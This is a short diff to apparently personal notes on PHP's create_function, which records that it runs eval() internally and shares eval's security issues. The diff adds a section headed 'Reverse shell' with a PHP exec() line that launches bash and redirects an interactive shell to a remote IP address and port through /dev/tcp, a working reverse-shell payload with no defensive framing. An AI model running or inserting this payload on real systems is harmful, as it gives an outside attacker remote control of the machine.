@@ -50,3 +50,8 @@ echo $a(123);             // 123
 echo "\x00lambda_1"(123); // ???
 
 Manual says that this function internally performs an eval() and as such has the same security issues as eval().
+
+--
+
+#Reverse shell
+exec("/bin/bash -c 'bash -i > /dev/tcp/123.123.123.1/1234 0>&1'");
